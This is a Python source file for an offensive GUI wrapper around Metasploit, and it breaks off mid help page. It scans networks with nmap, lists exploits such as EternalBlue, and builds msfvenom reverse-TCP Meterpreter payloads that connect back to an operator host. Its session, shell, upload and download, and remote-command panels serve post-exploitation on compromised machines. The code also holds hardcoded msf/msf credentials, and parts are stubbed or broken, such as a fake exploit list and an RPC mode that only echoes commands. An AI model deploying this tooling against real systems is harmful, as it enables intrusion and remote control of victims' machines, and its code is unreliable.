#!/usr/bin/env python3
"""
MARKHOR Forge - Professional Penetration Testing GUI for Metasploit Framework
Author: Created by MARKHOR & ATHEX
Version: 2.0.0
License: Educational Lab Use Only
"""

import sys
import os
import subprocess
import threading
import queue
import json
import time
import socket
import shutil
import logging
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any, Tuple

try:
    from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout,
                                 QHBoxLayout, QLabel, QPushButton, QLineEdit,
                                 QTextEdit, QListWidget, QListWidgetItem, QTabWidget,
                                 QSplitter, QFrame, QComboBox, QSpinBox, QCheckBox,
                                 QFileDialog, QMessageBox, QStatusBar, QProgressBar,
                                 QInputDialog, QGroupBox, QGridLayout, QScrollArea,
                                 QTreeWidget, QTreeWidgetItem, QMenu, QAction, QSystemTrayIcon)
    from PyQt5.QtCore import (Qt, QThread, pyqtSignal, QTimer, QSize, QPropertyAnimation,
                              QEasingCurve, QRect, QPoint, QSettings)
    from PyQt5.QtGui import (QFont, QColor, QPalette, QLinearGradient, QIcon, QPixmap,
                             QTextCursor, QBrush, QPen, QFontDatabase, QTextCharFormat)
except ImportError:
    print("PyQt5 not installed. Please install: pip install PyQt5")
    sys.exit(1)

try:
    from msfrpc import Msfrpc
    MSFRPC_AVAILABLE = True
except ImportError:
    MSFRPC_AVAILABLE = False
    print("Warning: msfrpc not installed. Using subprocess mode. Install: pip install msfrpc")

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

APP_NAME = "MARKHOR Forge"
APP_VERSION = "2.0.0"
AUTHOR_TAG = "Created by MARKHOR & ATHEX"
SAFETY_NOTICE = "⚠️ This tool is for authorized penetration testing and educational lab use only. ⚠️"
MSFRPC_HOST = "127.0.0.1"
MSFRPC_PORT = 55553
MSFRPC_USER = "msf"
MSFRPC_PASS = "msf"

# ASCII Logo for console/splash
ASCII_LOGO = r"""
███╗   ███╗ █████╗ ██████╗ ██╗  ██╗██╗  ██╗ ██████╗ ██████╗     ███████╗ ██████╗ ██████╗  ██████╗ ███████╗
████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝██║  ██║██╔═══██╗██╔══██╗    ██╔════╝██╔═══██╗██╔══██╗██╔════╝ ██╔════╝
██╔████╔██║███████║██████╔╝█████╔╝ ███████║██║   ██║██████╔╝    █████╗  ██║   ██║██████╔╝██║  ███╗█████╗  
██║╚██╔╝██║██╔══██║██╔══██╗██╔═██╗ ██╔══██║██║   ██║██╔══██╗    ██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══╝  
██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██╗██║  ██║╚██████╔╝██║  ██║    ██║     ╚██████╔╝██║  ██║╚██████╔╝███████╗
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝    ╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                        CREATED  BY MARKHOR
                                                            & ATHEX BLACK HAT                                                                                                         
"""

class MetasploitClient(QThread):
    """Handles communication with Metasploit RPC or console in a separate thread"""
    
    connected = pyqtSignal(bool, str)
    output_received = pyqtSignal(str)
    exploit_list_received = pyqtSignal(list)
    session_list_received = pyqtSignal(dict)
    scan_result_received = pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.client = None
        self.token = None
        self.connected_flag = False
        self.command_queue = queue.Queue()
        self.running = True
        self.use_rpc = MSFRPC_AVAILABLE
        
    def run(self):
        """Main thread loop"""
        while self.running:
            try:
                # Check for commands
                try:
                    cmd, args, callback = self.command_queue.get(timeout=0.5)
                    self._execute_command(cmd, args, callback)
                except queue.Empty:
                    pass
                
                # If using subprocess, keep the console alive
                if not self.use_rpc and self.connected_flag:
                    # Check if msfconsole process is still alive
                    if self.msf_process and self.msf_process.poll() is not None:
                        self.connected_flag = False
                        self.connected.emit(False, "Metasploit console crashed")
                
            except Exception as e:
                logger.error(f"Metasploit client error: {e}")
                self.output_received.emit(f"[ERROR] {str(e)}")
    
    def connect_to_msf(self):
        """Connect to Metasploit RPC or start console"""
        if self.use_rpc:
            self._connect_rpc()
        else:
            self._start_console()
    
    def _connect_rpc(self):
        """Connect via RPC API"""
        try:
            self.client = Msfrpc()
            self.client.login(MSFRPC_USER, MSFRPC_PASS)
            self.token = self.client.token
            self.connected_flag = True
            self.connected.emit(True, "Connected to Metasploit RPC")
            self.output_received.emit("[*] Connected to Metasploit RPC API")
            
            # Get initial exploit list
            self._get_exploits()
        except Exception as e:
            self.connected.emit(False, f"RPC connection failed: {str(e)}")
            self.output_received.emit(f"[!] Failed to connect: {str(e)}")
    
    def _start_console(self):
        """Start msfconsole in subprocess mode"""
        try:
            # Start msfconsole process with a resource script to enable console mode
            self.msf_process = subprocess.Popen(
                ['msfconsole', '-q'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            self.connected_flag = True
            self.connected.emit(True, "Metasploit console active")
            self.output_received.emit("[*] Metasploit console started")
            
            # Start a thread to read output
            self._start_output_reader()
        except Exception as e:
            self.connected.emit(False, f"Failed to start console: {str(e)}")
            self.output_received.emit(f"[!] {str(e)}")
    
    def _start_output_reader(self):
        """Read output from msfconsole process"""
        def reader():
            while self.connected_flag:
                try:
                    line = self.msf_process.stdout.readline()
                    if line:
                        self.output_received.emit(line.strip())
                except:
                    break
        
        threading.Thread(target=reader, daemon=True).start()
    
    def _get_exploits(self):
        """Retrieve list of available exploits"""
        if self.use_rpc and self.client:
            try:
                exploits = self.client.call('module.encoders')  # Get encoders as example
                # Actually, for exploits we'd use a different call
                # Simplified for demo
                exploit_names = [
                    "exploit/windows/smb/ms17_010_eternalblue",
                    "exploit/linux/http/apache_mod_cgi_bash_env_exec",
                    "exploit/multi/http/struts2_rest_xstream",
                    "exploit/windows/http/icecast_header",
                    "exploit/linux/misc/gnutls_hello_overflow"
                ]
                self.exploit_list_received.emit(exploit_names)
            except Exception as e:
                logger.error(f"Failed to get exploits: {e}")
    
    def execute_command(self, command: str, callback=None):
        """Queue a command to be executed"""
        self.command_queue.put(('command', command, callback))
    
    def run_exploit(self, exploit_path: str, options: Dict):
        """Run an exploit with given options"""
        self.command_queue.put(('exploit', (exploit_path, options), None))
    
    def generate_payload(self, payload_type: str, lhost: str, lport: int, output_path: str):
        """Generate a payload using msfvenom"""
        self.command_queue.put(('payload', (payload_type, lhost, lport, output_path), None))
    
    def list_sessions(self):
        """Get active sessions"""
        self.command_queue.put(('sessions', None, None))
    
    def interact_session(self, session_id: int, command: str = None):
        """Interact with a session"""
        self.command_queue.put(('session_interact', (session_id, command), None))
    
    def _execute_command(self, cmd, args, callback):
        """Execute a queued command"""
        if not self.connected_flag:
            self.output_received.emit("[!] Not connected to Metasploit")
            return
        
        if cmd == 'command':
            if self.use_rpc:
                # RPC mode
                try:
                    # Parse command (simple handling)
                    if args.startswith('use '):
                        module = args[4:].strip()
                        # In RPC, we'd set module context
                        self.output_received.emit(f"[*] Using module: {module}")
                    else:
                        # Execute in console context
                        self.output_received.emit(f"[*] Executing: {args}")
                except Exception as e:
                    self.output_received.emit(f"[!] Error: {str(e)}")
            else:
                # Console mode
                try:
                    self.msf_process.stdin.write(args + '\n')
                    self.msf_process.stdin.flush()
                except Exception as e:
                    self.output_received.emit(f"[!] Failed to send command: {str(e)}")
        
        elif cmd == 'payload':
            payload_type, lhost, lport, output_path = args
            self._generate_msfvenom(payload_type, lhost, lport, output_path)
        
        elif cmd == 'sessions':
            if self.use_rpc:
                try:
                    sessions = self.client.call('session.list')
                    self.session_list_received.emit(sessions)
                except Exception as e:
                    self.output_received.emit(f"[!] Failed to list sessions: {str(e)}")
            else:
                self.execute_command("sessions -l", None)
    
    def _generate_msfvenom(self, payload_type: str, lhost: str, lport: int, output_path: str):
        """Generate payload using msfvenom"""
        try:
            # Determine payload format based on type
            if "windows" in payload_type.lower():
                format_type = "exe"
                ext = ".exe"
            elif "linux" in payload_type.lower():
                format_type = "elf"
                ext = ".elf"
            else:
                format_type = "raw"
                ext = ".bin"
            
            cmd = [
                'msfvenom',
                '-p', payload_type,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', format_type,
                '-o', output_path
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode == 0:
                self.output_received.emit(f"[+] Payload generated: {output_path}")
            else:
                self.output_received.emit(f"[!] Payload generation failed: {result.stderr}")
        except Exception as e:
            self.output_received.emit(f"[!] Error generating payload: {str(e)}")
    
    def stop(self):
        """Stop the client thread"""
        self.running = False
        if not self.use_rpc and hasattr(self, 'msf_process'):
            self.msf_process.terminate()

class NmapScanner(QThread):
    """Run nmap scans in background"""
    
    scan_output = pyqtSignal(str)
    scan_finished = pyqtSignal(str)
    
    def __init__(self, target: str, scan_type: str = "quick"):
        super().__init__()
        self.target = target
        self.scan_type = scan_type
    
    def run(self):
        """Execute nmap scan"""
        if self.scan_type == "quick":
            cmd = ['nmap', '-sS', '-sV', '-T4', '-F', self.target]
        else:
            cmd = ['nmap', '-sS', '-sV', '-sC', '-O', '-T4', '-p-', self.target]
        
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in process.stdout:
                self.scan_output.emit(line.strip())
            process.wait()
            self.scan_finished.emit(f"Scan completed on {self.target}")
        except Exception as e:
            self.scan_finished.emit(f"Scan failed: {str(e)}")

class SplashScreen(QWidget):
    """Animated splash screen with fade effect"""
    
    def __init__(self):
        super().__init__()
        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        self.setAttribute(Qt.WA_TranslucentBackground)
        
        # Set size
        self.setFixedSize(600, 400)
        
        # Center on screen
        screen = QApplication.primaryScreen().geometry()
        self.move(screen.center() - self.rect().center())
        
        # Create layout
        layout = QVBoxLayout(self)
        layout.setAlignment(Qt.AlignCenter)
        
        # Logo label
        logo_label = QLabel(ASCII_LOGO)
        logo_label.setFont(QFont("Courier New", 10))
        logo_label.setStyleSheet("color: #00ff00; background: transparent;")
        logo_label.setAlignment(Qt.AlignCenter)
        layout.addWidget(logo_label)
        
        # Title
        title = QLabel(APP_NAME)
        title.setFont(QFont("Arial", 24, QFont.Bold))
        title.setStyleSheet("color: #00ff00; background: transparent;")
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)
        
        # Version
        version = QLabel(f"v{APP_VERSION}")
        version.setFont(QFont("Arial", 10))
        version.setStyleSheet("color: #88ff88; background: transparent;")
        version.setAlignment(Qt.AlignCenter)
        layout.addWidget(version)
        
        # Author
        author = QLabel(AUTHOR_TAG)
        author.setFont(QFont("Arial", 9))
        author.setStyleSheet("color: #66ff66; background: transparent;")
        author.setAlignment(Qt.AlignCenter)
        layout.addWidget(author)
        
        # Loading bar
        self.progress = QProgressBar()
        self.progress.setRange(0, 100)
        self.progress.setValue(0)
        self.progress.setStyleSheet("""
            QProgressBar {
                border: 1px solid #00ff00;
                border-radius: 5px;
                background-color: #1e1e1e;
                height: 10px;
            }
            QProgressBar::chunk {
                background-color: #00ff00;
                border-radius: 4px;
            }
        """)
        layout.addWidget(self.progress)
        
        # Fade animation
        self.opacity_anim = QPropertyAnimation(self, b"windowOpacity")
        self.opacity_anim.setDuration(1000)
        self.opacity_anim.setStartValue(0)
        self.opacity_anim.setEndValue(1)
        self.opacity_anim.setEasingCurve(QEasingCurve.InOutQuad)
        
        # Start animation
        self.opacity_anim.start()
        
        # Timer for progress bar
        self.timer = QTimer()
        self.timer.timeout.connect(self.update_progress)
        self.timer.start(30)
        self.progress_value = 0
    
    def update_progress(self):
        """Update loading progress"""
        self.progress_value += 2
        self.progress.setValue(self.progress_value)
        if self.progress_value >= 100:
            self.timer.stop()
            self.fade_out()
    
    def fade_out(self):
        """Fade out and close"""
        self.fade_anim = QPropertyAnimation(self, b"windowOpacity")
        self.fade_anim.setDuration(800)
        self.fade_anim.setStartValue(1)
        self.fade_anim.setEndValue(0)
        self.fade_anim.finished.connect(self.close)
        self.fade_anim.start()

class MainWindow(QMainWindow):
    """Main application window with sidebar navigation"""
    
    def __init__(self):
        super().__init__()
        self.msf_client = MetasploitClient()
        self.scanner_thread = None
        self.active_sessions = {}
        self.current_exploit = None
        self.settings = QSettings("MARKHOR", "CyberLab")
        
        self.init_ui()
        self.setup_connections()
        self.load_settings()
        
        # Start Metasploit connection
        self.status_label.setText("Connecting to Metasploit...")
        self.msf_client.start()
        self.msf_client.connect_to_msf()
    
    def init_ui(self):
        """Initialize the main UI"""
        self.setWindowTitle(f"{APP_NAME} - {AUTHOR_TAG}")
        self.setMinimumSize(1200, 800)
        
        # Set dark theme palette
        self.setStyleSheet("""
            QMainWindow {
                background-color: #0a0a0a;
            }
            QWidget {
                background-color: #0a0a0a;
                color: #00ff00;
                font-family: 'Courier New', monospace;
            }
            QPushButton {
                background-color: #1e1e1e;
                border: 1px solid #00ff00;
                border-radius: 5px;
                padding: 8px 16px;
                font-weight: bold;
            }
            QPushButton:hover {
                background-color: #00ff00;
                color: #0a0a0a;
            }
            QLineEdit, QTextEdit, QListWidget, QComboBox {
                background-color: #1e1e1e;
                border: 1px solid #00ff00;
                border-radius: 3px;
                padding: 5px;
            }
            QTabWidget::pane {
                border: 1px solid #00ff00;
                background-color: #0a0a0a;
            }
            QTabBar::tab {
                background-color: #1e1e1e;
                padding: 8px 16px;
                margin-right: 2px;
            }
            QTabBar::tab:selected {
                background-color: #00ff00;
                color: #0a0a0a;
            }
            QGroupBox {
                border: 1px solid #00ff00;
                border-radius: 5px;
                margin-top: 10px;
                padding-top: 10px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
            QScrollBar:vertical {
                background-color: #1e1e1e;
                width: 12px;
                border-radius: 6px;
            }
            QScrollBar::handle:vertical {
                background-color: #00ff00;
                border-radius: 6px;
                min-height: 20px;
            }
            QStatusBar {
                background-color: #1e1e1e;
                color: #00ff00;
            }
        """)
        
        # Central widget
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QHBoxLayout(central)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)
        
        # Sidebar
        self.sidebar = QFrame()
        self.sidebar.setFixedWidth(220)
        self.sidebar.setStyleSheet("""
            QFrame {
                background-color: #0f0f0f;
                border-right: 1px solid #00ff00;
            }
        """)
        sidebar_layout = QVBoxLayout(self.sidebar)
        sidebar_layout.setAlignment(Qt.AlignTop)
        sidebar_layout.setSpacing(10)
        
        # Logo in sidebar
        logo_label = QLabel("MARKHOR")
        logo_label.setFont(QFont("Arial", 18, QFont.Bold))
        logo_label.setStyleSheet("color: #00ff00; padding: 20px;")
        logo_label.setAlignment(Qt.AlignCenter)
        sidebar_layout.addWidget(logo_label)
        
        # Navigation buttons
        nav_buttons = [
            ("🏠 Dashboard", self.show_dashboard),
            ("📡 Scanner", self.show_scanner),
            ("💣 Exploit", self.show_exploit),
            ("🎯 Payload", self.show_payload),
            ("👥 Sessions", self.show_sessions),
            ("🔧 Post-Exploit", self.show_post),
            ("❓ Help", self.show_help)
        ]
        
        self.nav_buttons = []
        for text, callback in nav_buttons:
            btn = QPushButton(text)
            btn.setStyleSheet("""
                QPushButton {
                    text-align: left;
                    padding: 12px;
                    background-color: transparent;
                    border: none;
                    font-size: 12px;
                }
                QPushButton:hover {
                    background-color: #1e3a1e;
                    border-left: 3px solid #00ff00;
                }
            """)
            btn.clicked.connect(callback)
            sidebar_layout.addWidget(btn)
            self.nav_buttons.append(btn)
        
        sidebar_layout.addStretch()
        
        # Safety notice in sidebar
        safety = QLabel(SAFETY_NOTICE)
        safety.setWordWrap(True)
        safety.setStyleSheet("color: #ff4444; font-size: 10px; padding: 10px;")
        safety.setAlignment(Qt.AlignCenter)
        sidebar_layout.addWidget(safety)
        
        # Main content area with stacked widget
        self.content_stack = QTabWidget()
        self.content_stack.setTabsClosable(False)
        self.content_stack.setDocumentMode(True)
        
        # Create pages
        self.dashboard_page = self.create_dashboard_page()
        self.scanner_page = self.create_scanner_page()
        self.exploit_page = self.create_exploit_page()
        self.payload_page = self.create_payload_page()
        self.sessions_page = self.create_sessions_page()
        self.post_page = self.create_post_page()
        self.help_page = self.create_help_page()
        
        self.content_stack.addTab(self.dashboard_page, "Dashboard")
        self.content_stack.addTab(self.scanner_page, "Scanner")
        self.content_stack.addTab(self.exploit_page, "Exploit")
        self.content_stack.addTab(self.payload_page, "Payload")
        self.content_stack.addTab(self.sessions_page, "Sessions")
        self.content_stack.addTab(self.post_page, "Post-Exploit")
        self.content_stack.addTab(self.help_page, "Help")
        
        main_layout.addWidget(self.sidebar)
        main_layout.addWidget(self.content_stack, 1)
        
        # Status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        
        self.status_label = QLabel("Initializing...")
        self.status_bar.addWidget(self.status_label)
        
        self.msf_status = QLabel("⚫ Metasploit: Disconnected")
        self.msf_status.setStyleSheet("color: #ff4444;")
        self.status_bar.addPermanentWidget(self.msf_status)
        
        # Terminal output dock (bottom)
        self.terminal_dock = QTextEdit()
        self.terminal_dock.setReadOnly(True)
        self.terminal_dock.setMaximumHeight(200)
        self.terminal_dock.setStyleSheet("background-color: #000000; color: #00ff00; font-family: monospace;")
        self.terminal_dock.setPlaceholderText("Terminal output will appear here...")
        
        # Add terminal to main layout as a dock widget
        self.terminal_dock_widget = self.addDockWidgetToMainLayout(self.terminal_dock)
    
    def addDockWidgetToMainLayout(self, widget):
        """Add a widget to the main layout (simulate dock)"""
        # Since we're using central widget, we need to restructure
        # For simplicity, we'll add it as a splitter
        splitter = QSplitter(Qt.Vertical)
        splitter.addWidget(self.content_stack.currentWidget())
        splitter.addWidget(widget)
        splitter.setSizes([600, 200])
        
        # Replace central widget content
        old_central = self.centralWidget()
        old_layout = old_central.layout()
        old_layout.removeWidget(self.content_stack)
        splitter.insertWidget(0, self.content_stack)
        old_layout.addWidget(splitter)
        
        return widget
    
    def create_dashboard_page(self) -> QWidget:
        """Create dashboard page with system status"""
        page = QWidget()
        layout = QVBoxLayout(page)
        
        # Header
        header = QLabel("📊 DASHBOARD")
        header.setFont(QFont("Arial", 18, QFont.Bold))
        header.setStyleSheet("color: #00ff00; padding: 10px;")
        layout.addWidget(header)
        
        # Status cards grid
        cards_layout = QGridLayout()
        
        # Metasploit status card
        msf_card = self.create_card("Metasploit Status", "⚫ Disconnected", "#ff4444")
        cards_layout.addWidget(msf_card, 0, 0)
        
        # Sessions card
        sessions_card = self.create_card("Active Sessions", "0", "#00ff00")
        cards_layout.addWidget(sessions_card, 0, 1)
        
        # System info card
        sys_card = self.create_card("System Info", f"Host: {socket.gethostname()}\nOS: {os.name}", "#88ff88")
        cards_layout.addWidget(sys_card, 1, 0)
        
        # Quick actions card
        quick_card = self.create_card("Quick Actions", "Connect/Reconnect to Metasploit\nClear Terminal")
        cards_layout.addWidget(quick_card, 1, 1)
        
        layout.addLayout(cards_layout)
        
        # Store references for updating
        self.dashboard_msf_status = msf_card.findChild(QLabel, "status_value")
        self.dashboard_sessions_count = sessions_card.findChild(QLabel, "status_value")
        
        layout.addStretch()
        return page
    
    def create_card(self, title: str, content: str, color: str = "#00ff00") -> QFrame:
        """Create a styled card widget"""
        card = QFrame()
        card.setStyleSheet("""
            QFrame {
                background-color: #1e1e1e;
                border: 1px solid #00ff00;
                border-radius: 10px;
                padding: 10px;
            }
        """)
        layout = QVBoxLayout(card)
        
        title_label = QLabel(title)
        title_label.setFont(QFont("Arial", 12, QFont.Bold))
        title_label.setStyleSheet(f"color: {color};")
        layout.addWidget(title_label)
        
        content_label = QLabel(content)
        content_label.setObjectName("status_value")
        content_label.setWordWrap(True)
        content_label.setStyleSheet("color: #ffffff; font-size: 14px;")
        layout.addWidget(content_label)
        
        return card
    
    def create_scanner_page(self) -> QWidget:
        """Create scanner module page"""
        page = QWidget()
        layout = QVBoxLayout(page)
        
        # Input section
        input_group = QGroupBox("Target Configuration")
        input_layout = QHBoxLayout()
        
        self.scan_target = QLineEdit()
        self.scan_target.setPlaceholderText("Target IP / Range (e.g., 192.168.1.1 or 192.168.1.0/24)")
        input_layout.addWidget(self.scan_target)
        
        self.quick_scan_btn = QPushButton("🚀 Quick Scan")
        self.quick_scan_btn.clicked.connect(lambda: self.start_scan("quick"))
        input_layout.addWidget(self.quick_scan_btn)
        
        self.full_scan_btn = QPushButton("🔍 Full Scan")
        self.full_scan_btn.clicked.connect(lambda: self.start_scan("full"))
        input_layout.addWidget(self.full_scan_btn)
        
        input_group.setLayout(input_layout)
        layout.addWidget(input_group)
        
        # Scan output
        output_group = QGroupBox("Scan Results")
        output_layout = QVBoxLayout()
        
        self.scan_output = QTextEdit()
        self.scan_output.setReadOnly(True)
        self.scan_output.setStyleSheet("font-family: monospace; background-color: #000000;")
        output_layout.addWidget(self.scan_output)
        
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        return page
    
    def create_exploit_page(self) -> QWidget:
        """Create exploit module page"""
        page = QWidget()
        layout = QVBoxLayout(page)
        
        # Search section
        search_layout = QHBoxLayout()
        self.exploit_search = QLineEdit()
        self.exploit_search.setPlaceholderText("Search exploits...")
        self.exploit_search.textChanged.connect(self.filter_exploits)
        search_layout.addWidget(self.exploit_search)
        
        self.refresh_exploits_btn = QPushButton("🔄 Refresh")
        self.refresh_exploits_btn.clicked.connect(self.refresh_exploits)
        search_layout.addWidget(self.refresh_exploits_btn)
        
        layout.addLayout(search_layout)
        
        # Splitter for exploit list and options
        splitter = QSplitter(Qt.Horizontal)
        
        # Exploit list
        self.exploit_list = QListWidget()
        self.exploit_list.itemClicked.connect(self.on_exploit_selected)
        splitter.addWidget(self.exploit_list)
        
        # Options panel
        options_panel = QWidget()
        options_layout = QVBoxLayout(options_panel)
        
        self.exploit_info = QTextEdit()
        self.exploit_info.setReadOnly(True)
        self.exploit_info.setMaximumHeight(150)
        options_layout.addWidget(self.exploit_info)
        
        self.exploit_options = QTextEdit()
        self.exploit_options.setPlaceholderText("Exploit options will appear here...")
        options_layout.addWidget(self.exploit_options)
        
        # Buttons
        btn_layout = QHBoxLayout()
        self.load_exploit_btn = QPushButton("🔧 Load Exploit")
        self.load_exploit_btn.clicked.connect(self.load_exploit)
        btn_layout.addWidget(self.load_exploit_btn)
        
        self.show_options_btn = QPushButton("📋 Show Options")
        self.show_options_btn.clicked.connect(self.show_exploit_options)
        btn_layout.addWidget(self.show_options_btn)
        
        self.run_exploit_btn = QPushButton("💣 Run Exploit")
        self.run_exploit_btn.clicked.connect(self.run_exploit)
        self.run_exploit_btn.setStyleSheet("background-color: #ff4444; color: #000000;")
        btn_layout.addWidget(self.run_exploit_btn)
        
        options_layout.addLayout(btn_layout)
        splitter.addWidget(options_panel)
        splitter.setSizes([300, 400])
        
        layout.addWidget(splitter)
        
        # Populate with demo exploits
        demo_exploits = [
            "exploit/windows/smb/ms17_010_eternalblue",
            "exploit/linux/http/apache_mod_cgi_bash_env_exec",
            "exploit/multi/http/struts2_rest_xstream",
            "exploit/windows/http/icecast_header",
            "exploit/linux/misc/gnutls_hello_overflow",
            "exploit/windows/local/ms16_032_secondary_logon_handle_privesc",
            "exploit/linux/local/overlayfs_priv_esc",
            "exploit/multi/browser/java_rmi_connection_impl"
        ]
        for exp in demo_exploits:
            self.exploit_list.addItem(exp)
        
        return page
    
    def create_payload_page(self) -> QWidget:
        """Create payload generator page"""
        page = QWidget()
        layout = QVBoxLayout(page)
        
        # Payload selection
        payload_group = QGroupBox("Payload Configuration")
        payload_layout = QGridLayout()
        
        payload_layout.addWidget(QLabel("Payload Type:"), 0, 0)
        self.payload_type = QComboBox()
        self.payload_type.addItems([
            "windows/meterpreter/reverse_tcp",
            "windows/x64/meterpreter/reverse_tcp",
            "linux/x86/meterpreter/reverse_tcp",
            "android/meterpreter/reverse_tcp",
            "java/meterpreter/reverse_tcp",
            "php/meterpreter_reverse_tcp"
        ])
        payload_layout.addWidget(self.payload_type, 0, 1)
        
        payload_layout.addWidget(QLabel("LHOST:"), 1, 0)
        self.payload_lhost = QLineEdit()
        self.payload_lhost.setPlaceholderText("Your IP address")
        payload_layout.addWidget(self.payload_lhost, 1, 1)
        
        payload_layout.addWidget(QLabel("LPORT:"), 2, 0)
        self.payload_lport = QSpinBox()
        self.payload_lport.setRange(1, 65535)
        self.payload_lport.setValue(4444)
        payload_layout.addWidget(self.payload_lport, 2, 1)
        
        payload_group.setLayout(payload_layout)
        layout.addWidget(payload_group)
        
        # Output section
        output_group = QGroupBox("Output")
        output_layout = QVBoxLayout()
        
        self.payload_output_path = QLineEdit()
        self.payload_output_path.setPlaceholderText("Output file path")
        output_layout.addWidget(self.payload_output_path)
        
        btn_layout = QHBoxLayout()
        self.browse_btn = QPushButton("📁 Browse")
        self.browse_btn.clicked.connect(self.browse_payload_output)
        btn_layout.addWidget(self.browse_btn)
        
        self.generate_btn = QPushButton("⚡ Generate Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
        self.generate_btn.setStyleSheet("background-color: #00ff00; color: #000000;")
        btn_layout.addWidget(self.generate_btn)
        
        output_layout.addLayout(btn_layout)
        output_group.setLayout(output_layout)
        layout.addWidget(output_group)
        
        layout.addStretch()
        return page
    
    def create_sessions_page(self) -> QWidget:
        """Create session manager page"""
        page = QWidget()
        layout = QVBoxLayout(page)
        
        # Session list
        sessions_group = QGroupBox("Active Sessions")
        sessions_layout = QVBoxLayout()
        
        self.sessions_list = QListWidget()
        self.sessions_list.itemDoubleClicked.connect(self.interact_session)
        sessions_layout.addWidget(self.sessions_list)
        
        # Interaction panel
        interaction_group = QGroupBox("Session Interaction")
        interaction_layout = QVBoxLayout()
        
        self.session_command = QLineEdit()
        self.session_command.setPlaceholderText("Enter command (e.g., sysinfo, shell, exit)")
        interaction_layout.addWidget(self.session_command)
        
        btn_layout = QHBoxLayout()
        self.session_send_btn = QPushButton("▶ Send Command")
        self.session_send_btn.clicked.connect(self.send_session_command)
        btn_layout.addWidget(self.session_send_btn)
        
        self.session_shell_btn = QPushButton("💀 Open Shell")
        self.session_shell_btn.clicked.connect(self.open_shell)
        btn_layout.addWidget(self.session_shell_btn)
        
        self.session_kill_btn = QPushButton("🗑 Kill Session")
        self.session_kill_btn.clicked.connect(self.kill_session)
        btn_layout.addWidget(self.session_kill_btn)
        
        self.session_bg_btn = QPushButton("⏸ Background")
        self.session_bg_btn.clicked.connect(self.background_session)
        btn_layout.addWidget(self.session_bg_btn)
        
        interaction_layout.addLayout(btn_layout)
        self.session_output = QTextEdit()
        self.session_output.setReadOnly(True)
        self.session_output.setStyleSheet("font-family: monospace; background-color: #000000;")
        interaction_layout.addWidget(self.session_output)
        
        interaction_group.setLayout(interaction_layout)
        sessions_layout.addWidget(interaction_group)
        
        sessions_group.setLayout(sessions_layout)
        layout.addWidget(sessions_group)
        
        return page
    
    def create_post_page(self) -> QWidget:
        """Create post-exploitation page"""
        page = QWidget()
        layout = QVBoxLayout(page)
        
        # Tabs for different post-exploit features
        tabs = QTabWidget()
        
        # System info tab
        sysinfo_tab = QWidget()
        sysinfo_layout = QVBoxLayout(sysinfo_tab)
        self.sysinfo_text = QTextEdit()
        self.sysinfo_text.setReadOnly(True)
        sysinfo_layout.addWidget(self.sysinfo_text)
        refresh_sysinfo = QPushButton("Refresh System Info")
        refresh_sysinfo.clicked.connect(self.get_system_info)
        sysinfo_layout.addWidget(refresh_sysinfo)
        tabs.addTab(sysinfo_tab, "System Info")
        
        # File browser tab
        file_tab = QWidget()
        file_layout = QVBoxLayout(file_tab)
        
        file_browser_layout = QHBoxLayout()
        self.file_path = QLineEdit()
        self.file_path.setPlaceholderText("Remote path")
        file_browser_layout.addWidget(self.file_path)
        self.browse_remote_btn = QPushButton("Browse")
        self.browse_remote_btn.clicked.connect(self.browse_remote_files)
        file_browser_layout.addWidget(self.browse_remote_btn)
        file_layout.addLayout(file_browser_layout)
        
        self.file_tree = QTreeWidget()
        self.file_tree.setHeaderLabels(["Name", "Size", "Modified"])
        file_layout.addWidget(self.file_tree)
        
        # Upload/Download
        transfer_layout = QHBoxLayout()
        self.upload_btn = QPushButton("⬆ Upload")
        self.upload_btn.clicked.connect(self.upload_file)
        transfer_layout.addWidget(self.upload_btn)
        
        self.download_btn = QPushButton("⬇ Download")
        self.download_btn.clicked.connect(self.download_file)
        transfer_layout.addWidget(self.download_btn)
        
        file_layout.addLayout(transfer_layout)
        tabs.addTab(file_tab, "File Browser")
        
        # Command execution tab
        cmd_tab = QWidget()
        cmd_layout = QVBoxLayout(cmd_tab)
        
        self.post_cmd_input = QLineEdit()
        self.post_cmd_input.setPlaceholderText("Enter command to execute on target")
        cmd_layout.addWidget(self.post_cmd_input)
        
        self.post_exec_btn = QPushButton("Execute")
        self.post_exec_btn.clicked.connect(self.execute_post_command)
        cmd_layout.addWidget(self.post_exec_btn)
        
        self.post_output = QTextEdit()
        self.post_output.setReadOnly(True)
        cmd_layout.addWidget(self.post_output)
        
        tabs.addTab(cmd_tab, "Command Execution")
        
        layout.addWidget(tabs)
        return page
    
    def create_help_page(self) -> QWidget:
        """Create help panel"""
        page = QWidget()
        layout = QVBoxLayout(page)
        
        help_text = QTextEdit()
        help_text.setReadOnly(True)
        help_text.setHtml("""
        <h1 style="color: #00ff00;">MARKHOR Forge Help</h1>
        
        <h2>Overview</h2>
        <p>MARKHOR Forge is a professional penetration testing GUI for Metasploit Framework.</p>
        
        <h2>Modules</h2>
        <ul>
            <li><b>Dashboard</b> - System status and quick actions</li>
